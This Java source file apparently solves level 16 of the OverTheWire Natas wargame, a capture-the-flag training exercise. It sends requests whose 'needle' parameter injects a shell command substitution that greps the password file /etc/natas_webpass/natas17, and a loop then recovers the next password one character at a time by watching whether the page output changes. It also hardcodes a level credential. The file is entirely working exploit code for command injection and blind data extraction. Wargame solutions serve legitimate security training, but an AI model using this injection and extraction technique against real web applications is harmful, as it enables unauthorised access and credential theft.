package com.behnam.natas;

import org.springframework.http.*;
import org.springframework.stereotype.Component;
import org.springframework.web.client.RestTemplate;

@Component
public class Natas16 {
    public boolean checkPassContain(String pass) {
        RestTemplate restTemplate = new RestTemplate();
        HttpHeaders headers = new HttpHeaders();
        headers.setBasicAuth("natas16", "WaIHEacj63wnNIBROHeqi3p9t0m5nhmh");

        ResponseEntity<String> result =restTemplate.exchange(
                "http://natas16.natas.labs.overthewire.org/?needle=$(grep -E ^"+pass+".* /etc/natas_webpass/natas17)Africans", HttpMethod.GET, new HttpEntity<Object>(headers),
                String.class);

        String res = result.getBody().split("pre")[1].replaceAll(">","").replaceAll("</","").replaceAll("\n","");
        return !"Africans".equals(res);
    }

    public void solve() {
        String chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
        String password="";
        for (int i=0;i<32;i++) {
            for (char c : chars.toCharArray()) {
                if (checkPassContain(password+c)) {
                    password=password+c;
                    System.out.println(password);
                }

            }
        }
    }
}
